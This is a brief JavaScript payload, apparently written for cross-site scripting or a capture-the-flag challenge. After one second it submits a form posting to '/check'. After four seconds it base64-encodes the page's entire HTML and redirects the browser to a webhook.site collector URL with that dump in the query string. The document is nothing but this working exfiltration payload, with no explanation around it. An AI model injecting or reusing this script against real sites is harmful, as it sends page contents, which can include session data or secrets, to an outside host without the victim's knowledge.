setTimeout(() => {
  const form = document.querySelector('form[action="/check"]');
  if (form) form.submit();
}, 1000);

setTimeout(() => {
  const dump = btoa(document.documentElement.innerHTML);
  location.href = "https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?dump=" + dump;
}, 4000);
